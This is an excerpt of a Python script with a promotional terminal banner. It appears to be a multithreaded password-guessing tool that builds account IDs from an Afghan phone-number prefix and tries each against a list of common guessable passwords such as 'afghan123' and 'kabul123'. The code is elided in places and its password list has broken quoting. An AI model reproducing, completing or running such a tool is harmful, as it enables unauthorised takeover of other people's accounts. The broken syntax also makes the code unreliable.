...
\033[1;96m OTHER COUNTRIES : JUST FILE
 \033[1;92m----------------------------------------
 \033[1;92m[+] 𝘼𝙐𝙏𝙃𝙊𝙍      :\033[1;92m  √  420
 \033[1;92m[+] 𝙒𝙃𝘼𝙏𝙎𝘼𝙋𝙋    : \033[1;92m √  +4591937471
 \033[1;92m[+] 𝗕𝗘𝗦𝗧 𝗙𝗥𝗜𝗘𝗡𝗗 : \033[92;1m √  500👈
...
def afg():
                ...
                with tred(max_workers=30) as S1N:     
                        ...
                        for psx in user:
                                ids = code+psx
                                passlist = [psx,ids,'khankhan','afghan123','afghanistan','khan123','afghan1234','afghan12345','khan12345afghanistan123,'kabul123,'Afghaniatan,'afghanistan,'afghan1122,'Kabul1122,'Afghan1234,'100200,'۱۲۳۴۵۶,'10002000,'100100,'200300,'500500,'500600,'700800,'50005000,'102030,'@@@###']
                                S1N.submit(rd,ids,passlist)
                print('\033[1;37m')
                line()
                print(' THE PROCESS HAS COMPLETED')
